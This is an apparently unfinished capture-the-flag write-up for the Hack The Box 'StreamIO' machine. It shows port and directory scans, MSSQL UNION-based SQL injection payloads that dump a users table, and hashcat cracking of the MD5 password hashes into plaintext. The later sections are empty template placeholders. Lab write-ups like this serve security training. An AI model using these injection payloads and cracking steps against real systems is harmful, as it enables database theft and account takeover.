
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sV -sC streamio.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-30 09:30 EDT
Nmap scan report for streamio.htb (10.129.151.80)
Host is up (0.029s latency).
Not shown: 986 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-30 20:30:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Streamio
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-09-30T20:31:29+00:00; +7h00m02s from scanner time.
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-30T20:30:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.17 seconds

```

### Service Enumeration

```
 gobuster dir -u https://watch.streamio.htb -w  /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k -x .php

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]
/INDEX.php            (Status: 200) [Size: 2829]
/*checkout*           (Status: 400) [Size: 3420]

```

navingating to /search.php discloses a database of movies.

```
 cat search.txt
POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

q=test

```

```
sqlmap -r search.txt --schema --force-ssl
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:44:02 /2026-10-01/

[13:44:02] [INFO] parsing HTTP request from 'search.txt'
[13:44:02] [INFO] testing connection to the target URL
[13:44:08] [INFO] testing if the target URL content is stable
[13:44:08] [INFO] target URL content is stable
[13:44:08] [INFO] testing if POST parameter 'q' is dynamic
[13:44:08] [INFO] POST parameter 'q' appears to be dynamic
[13:44:08] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
[13:44:08] [INFO] testing for SQL injection on POST parameter 'q'
[13:44:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'https://watch.streamio.htb/blocked.php'. Do you want to follow? [Y/n] n
[13:44:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:44:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:44:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:44:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:44:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:44:16] [INFO] testing 'Generic inline queries'
[13:44:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:44:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:44:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:44:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:44:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:44:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:44:21] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[13:44:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:44:34] [WARNING] POST parameter 'q' does not seem to be injectable
[13:44:34] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[13:44:34] [WARNING] your sqlmap version is outdated

[*] ending @ 13:44:34 /2026-10-01/


```

```
' UNION SELECT 1,@@version,3,4,5,6-- 
```

```
' UNION SELECT 1,DB_NAME(),3,4,5,6--
```

```
' UNION SELECT 1,(SELECT STRING_AGG(name, ',') FROM sys.tables),3,4,5,6--
```

```
' UNION SELECT 1,(SELECT STRING_AGG(name, ',') FROM sys.columns WHERE object_id = OBJECT_ID('users')),3,4,5,6--
```

```
' UNION SELECT 1,(SELECT STRING_AGG(CONCAT(id,':',username,':',password,':',is_staff), ' | ') FROM users),3,4,5,6--
```

users:

```
##### 3:James :c660060492d9edcaa8332d89c99c9239 :1 | 4:Theodore :925e5408ecb67aea449373d668b7359e :1 | 5:Samantha :083ffae904143c4796e464dac33c1f7d :1 | 6:Lauren :08344b85b329d7efd611b7a7743e8a09 :1 | 7:William :d62be0dc82071bccc1322d64ec5b6c51 :1 | 8:Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5 :1 | 9:Robert :f03b910e2bd0313a23fdd7575f34a694 :1 | 10:Thane :3577c47eb1e12c8ba021611e1280753c :1 | 11:Carmon :35394484d89fcfdb3c5e447fe749d213 :1 | 12:Barry :54c88b2dbd7b1a84012fabc1a4c73415 :1 | 13:Oliver :fd78db29173a5cf701bd69027cb9bf6b :1 | 14:Michelle :b83439b16f844bd6ffe35c02fe21b3c0 :1 | 15:Gloria :0cfaaaafb559f081df2befbe66686de0 :1 | 16:Victoria :b22abb47a02b52d5dfa27fb0b534f693 :1 | 17:Alexendra :1c2b3d8270321140e5153f6637d3ee53 :1 | 18:Baxter :22ee218331afd081b0dcd8115284bae3 :1 | 19:Clara :ef8f3d30a856cf166fb8215aca93e9ff :1 | 20:Barbra :3961548825e3e21df5646cafe11c6c76 :1 | 21:Lenord :ee0b8a0937abd60c2882eacb2f8dc49f :1 | 22:Austin :0049ac57646627b8d7aeaccf8b6a936f :1 | 23:Garfield :8097cedd612cc37c29db152b6e9edbd3 :1 | 24:Juliette :6dcd87740abb64edfa36d170f0d5450d :1 | 25:Victor :bf55e15b119860a6e6b5a164377da719 :1 | 26:Lucifer :7df45a9e3de3863807c026ba48e55fb3 :1 | 27:Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8 :1 | 28:Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5 :1 | 29:Robin :dc332fb5576e9631c9dae83f194f8e70 :1 | 30:Stan :384463526d288edcc95fc3701e523bc7 :1 | 31:yoshihide :b779ba15cedfd22a023c4d8bcf5f2332 :1 | 33:admin :665a50ac9eaa781e4f7f04199db97a11 :0
```

cracking the hashes:

```
 hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 30 digests; 30 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1915 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Thu Oct  1 14:55:30 2026 (2 secs)
Time.Estimated...: Thu Oct  1 14:55:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6160.3 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 12/30 (40.00%) Digests (total), 12/30 (40.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 42%

Started: Thu Oct  1 14:55:28 2026
Stopped: Thu Oct  1 14:55:34 2026

```
---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)

